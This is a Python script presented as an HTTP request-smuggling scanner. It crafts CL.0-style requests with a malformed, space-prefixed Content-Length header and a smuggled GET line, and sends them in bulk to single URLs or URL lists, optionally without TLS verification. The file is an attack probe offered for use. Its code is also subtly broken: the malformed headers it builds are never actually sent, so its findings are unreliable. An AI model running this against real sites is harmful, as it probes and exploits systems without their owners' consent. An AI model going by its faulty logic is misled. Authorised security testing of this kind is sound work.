import argparse
import http.client
import ssl
import sys
import colorama
from colorama import Fore, Style
from urllib.parse import urlparse
import socket

colorama.init()

def send_malformed_request(url, gadget, method, insecure=False, null_payload=False):
    parsed_url = urlparse(url)
    host = parsed_url.netloc
    path = parsed_url.path or "/"
    port = 443 if parsed_url.scheme == "https" else 80

    # Define Content-Length header based on gadget
    if gadget == "nameprefix1":
        content_length = " Content-Length: 48"  # One space, fixed 48 as in Burp
    elif gadget == "nameprefix2":
        content_length = "  Content-Length: 48"  # Two spaces, fixed 48
    else:
        content_length = " Content-Length: 48"  # Default to one space

    # Base payload (46 bytes)
    base_payload = "GET /wrtztrw?wrtztrw=wrtztrw HTTP/1.1\r\nX-YzBqv: \r\n"
    # Append null byte if null_payload is True (mimicking Burp Intruder)
    payload = base_payload + "\x00" if null_payload else base_payload

    # Raw request matching Burp Suite
    raw_request = (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Cache-Control: max-age=0\r\n"
        f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
        f"Accept-Encoding: gzip, deflate, br\r\n"
        f"Connection: keep-alive\r\n"
        f"Via: null\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Foo: bar\r\n"
        f"{content_length}\r\n"
        f"\r\n"
        f"{payload}"
    )

    try:
        # Set up connection
        context = ssl._create_unverified_context() if insecure else ssl.create_default_context()
        conn = http.client.HTTPSConnection(host, port, context=context, timeout=10) if parsed_url.scheme == "https" else http.client.HTTPConnection(host, port, timeout=10)

        # Send raw request
        conn.request(method, path, body=raw_request.split("\r\n\r\n", 1)[1], headers={})
        response = conn.getresponse()

        # Read headers and status
        status = response.status
        headers = response.getheaders()
        conn.close()

        class Response:
            def __init__(self, status, headers):
                self.status_code = status
                self.headers = {k: v for k, v in headers}
        return Response(status, headers)

    except (socket.timeout, ConnectionRefusedError, ssl.SSLError, http.client.HTTPException) as e:
        print(f"{Fore.YELLOW}Error for {gadget} ({method}) on {url}: {str(e)}{Style.RESET_ALL}")
        return None

def check_vulnerability(url, gadget, method, output_file, insecure):
    response = send_malformed_request(url, gadget, method, insecure, null_payload=False)
    status = response.status_code if response else "No Response"
    vulnerable = False

    if response and response.status_code in [200, 301, 302, 307, 404, 401, 405]:
        # Try up to 10 requests, with null payload after first request (mimicking Burp Intruder)
        for i in range(10):
            null_payload = i > 0  # Send null payload after first request
            repeat_response = send_malformed_request(url, gadget, method, insecure, null_payload)
            if repeat_response:
                location = repeat_response.headers.get("Location", "")
                # Check for wrtztrw?wrtztrw=wrtztrw anywhere in Location header
                if "wrtztrw?wrtztrw=wrtztrw" in location:
                    vulnerable = True
                    filename = f"cl-0-{gadget}-{method.lower()}.txt"
                    with open(filename, "w") as f:
                        parsed_url = urlparse(url)
                        path = parsed_url.path or "/"
                        content_length = f" Content-Length: 48" if gadget == "nameprefix1" else f"  Content-Length: 48"
                        raw_request = (
                            f"{method} {path} HTTP/1.1\r\n"
                            f"Host: {parsed_url.netloc}\r\n"
                            f"Cache-Control: max-age=0\r\n"
                            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\n"
                            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n"
                            f"Accept-Encoding: gzip, deflate, br\r\n"
                            f"Connection: keep-alive\r\n"
                            f"Via: null\r\n"
                            f"Content-Type: application/x-www-form-urlencoded\r\n"
                            f"Foo: bar\r\n"
                            f"{content_length}\r\n"
                            f"\r\n"
                            f"GET /wrtztrw?wrtztrw=wrtztrw HTTP/1.1\r\n"
                            f"X-YzBqv: \r\n"
                            f"{'\\x00' if null_payload else ''}"
                        )
                        f.write(raw_request)
                    if output_file:
                        with open(output_file, "a") as f:
                            f.write(f"Vulnerable request saved to {filename}\n")
                    break

    color = Fore.RED if vulnerable else Fore.GREEN
    print(f"{color}Gadget: {gadget}, Method: {method}, Status: {status}, Vulnerable: {vulnerable}{Style.RESET_ALL}")

def scan_url(url, output_file, insecure):
    gadgets = [
        {"name": "nameprefix1", "method": "GET"},  # Prioritize GET, as confirmed in Burp
        {"name": "nameprefix1", "method": "POST"},
        {"name": "nameprefix2", "method": "GET"},
        {"name": "nameprefix2", "method": "POST"}
    ]
    for gadget in gadgets:
        check_vulnerability(url, gadget["name"], gadget["method"], output_file, insecure)

def main():
    parser = argparse.ArgumentParser(description="Request Smuggling Vulnerability Scanner")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-u", "--url", help="Single URL to scan")
    group.add_argument("-l", "--list", help="File containing list of URLs")
    parser.add_argument("-o", "--output", help="Output file for vulnerable requests")
    parser.add_argument("-k", "--insecure", action="store_true", help="Disable SSL verification (insecure)")
    args = parser.parse_args()

    if args.url:
        scan_url(args.url, args.output, args.insecure)
    elif args.list:
        try:
            with open(args.list, "r") as f:
                urls = [line.strip() for line in f if line.strip()]
            for url in urls:
                print(f"\nScanning {url}...")
                scan_url(url, args.output, args.insecure)
        except FileNotFoundError:
            print(f"Error: File {args.list} not found")
            sys.exit(1)

    # Placeholder for future implementations
    # Craft request for CL TE testing
    # (will add later)
    # Craft request for TE CL testing
    # (will add later)
    # Craft request for TE TE testing
    # (will add later)

if __name__ == "__main__":
    main()
